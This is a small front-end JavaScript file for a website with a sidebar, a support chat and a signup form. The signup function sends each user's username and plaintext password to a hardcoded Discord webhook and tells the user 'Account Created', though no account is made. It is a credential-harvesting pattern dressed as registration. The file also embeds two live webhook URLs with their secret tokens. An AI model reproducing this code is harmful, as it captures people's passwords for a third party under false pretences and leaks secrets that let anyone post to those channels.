// SIDEBAR TOGGLE
function toggleSidebar() {
    document.querySelector(".sidebar").classList.toggle("collapsed");
}

// CHAT
function toggleChat() {
    document.querySelector(".chat-box").classList.toggle("open");
}

// SEND CHAT → YOUR WEBHOOK
function sendMessage() {
    const input = document.getElementById("chatInput");
    const msg = input.value;

    if (!msg) return;

    fetch("https://discord.com/api/webhooks/1486913651712724992/nK_fkyLouoC1FXHeLKXIH_XyBjSI_2k5RzcILzOcNpW38khjkqpqctAQtKz-v6RKLyog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: "Support Message: " + msg
        })
    });

    input.value = "";
}

// SIGNUP SYSTEM → WEBHOOK
function signup() {
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;

    fetch("https://discord.com/api/webhooks/1486915810533314662/YmVunZtYx0xnh2yGzGIcrVdPMTCzX47uDpntZuyZL9CRPbEu6OCpdaLMxsLurZCNXuYi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `NEW USER\nUsername: ${user}\nPassword: ${pass}`
        })
    });

    alert("Account Created");
}
